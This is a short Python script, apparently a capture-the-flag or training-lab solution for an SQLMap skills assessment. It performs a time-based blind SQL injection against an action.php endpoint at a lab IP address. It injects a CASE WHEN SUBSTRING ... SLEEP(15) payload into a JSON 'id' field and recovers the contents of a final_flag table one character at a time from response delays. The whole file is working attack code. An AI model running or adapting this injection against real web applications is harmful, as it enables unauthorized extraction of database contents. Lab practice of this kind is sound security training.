#find final_flag for skillsAssessmentSQLMapEssentials.md

import requests
import time

url = "http://83.136.255.142:56039/action.php"

headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "DNT": "1",
    "Host": "83.136.255.142:56039",
    "Origin": "http://83.136.255.142:56039",
    "Referer": "http://83.136.255.142:56039/shop.html",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

result = ''
for i in range(1, 60):  
    for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-':
        payload = {"id":f"1 AND (SELECT 1 FROM (SELECT CASE WHEN (SUBSTRING((SELECT content FROM final_flag LIMIT 1), {i}, 1)='{char}') THEN SLEEP(15) ELSE 0 END)CTfq)"}
        start = time.time()
        requests.post(url, headers=headers, json=payload)
        elapsed = time.time() - start
        
        if elapsed >= 10: 
            result += char
            print(f"Found character {i}: {char}")
            break

print("Content from final_flag:", result)
